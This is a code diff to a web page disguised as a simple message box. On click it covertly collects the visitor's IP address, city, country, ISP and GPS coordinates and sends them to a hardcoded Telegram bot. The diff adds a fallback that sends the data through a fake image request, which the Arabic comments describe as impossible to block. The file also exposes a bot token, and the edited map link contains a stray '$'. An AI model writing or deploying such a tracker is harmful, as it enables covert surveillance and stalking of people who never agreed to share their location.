@@ -9,7 +9,7 @@ index.html
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
         html, body { height: 100%; width: 100%; background-color: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
-        .box { background: #1e293b; padding: 40px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; max-width: 350px; border: 1px solid rgba(255,255,255,0.1); pointer-events: none; }
+        .box { background: #1e293b; padding: 40px 25px; border-radius: 30px; text-align: center; max-width: 350px; border: 1px solid rgba(255,255,255,0.1); pointer-events: none; }
         h3 { color: white; margin-bottom: 15px; }
         p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
         .btn-dummy { margin-top: 25px; background-color: #0088cc; color: white; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; display: block; }
@@ -28,30 +28,39 @@ index.html
     const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
     const ID = '6876904688';
 
+    // دالة إرسال ذكية: لو فشل الطلب البرمجي، تبعثه عن طريق "صورة وهمية" (مستحيل تنحظر)
     function send(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`;
+        fetch(url).catch(() => {
+            let img = new Image();
+            img.src = url;
+        });
     }
 
     function strike() {
-        // 1. محرك الـ IP (تفصيلي مع كل لمسة)
+        // --- المحرك 1: صيد الـ IP (مستقل تماماً) ---
+        // جربنا نجيب البيانات الكاملة
         fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(d => {
-            const info = `🌐 [بيانات الشبكة]\n━━━━━━━━━━━━\nIP: ${d.ip}\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة: ${d.org}\n━━━━━━━━━━━━`;
-            send(info);
+            send(`🌐 [صيد IP]\n━━━━━━━━━━━━\nالآي بي: ${d.ip}\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة: ${d.org}\n━━━━━━━━━━━━`);
         })
         .catch(() => {
-            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => send(`🌐 [IP سريع]: ${data.ip}`));
+            // لو الخدمة الأولى فشلت، جرب فوراً خدمة ipify (الأسرع في العالم)
+            fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => send(`🌐 [IP سريع]: ${data.ip}`))
+            .catch(() => send("❌ فشل صيد الـ IP بالكامل"));
         });
 
-        // 2. محرك الـ GPS (مصحح 100%)
+        // --- المحرك 2: صيد الـ GPS (مستقل تماماً) ---
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     const lat = pos.coords.latitude;
                     const lng = pos.coords.longitude;
-                    // الرابط العالمي الصحيح لخرائط جوجل
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                    // الرابط العالمي الصحيح
+                    const mapUrl = `https://www.google.com/maps?q=$${lat},${lng}`;
                     send(`📍 [موقع GPS]:\n${mapUrl}`);
                 },
                 (err) => {
@@ -62,6 +71,5 @@ index.html
         }
     }
 </script>
-
 </body>
 </html>
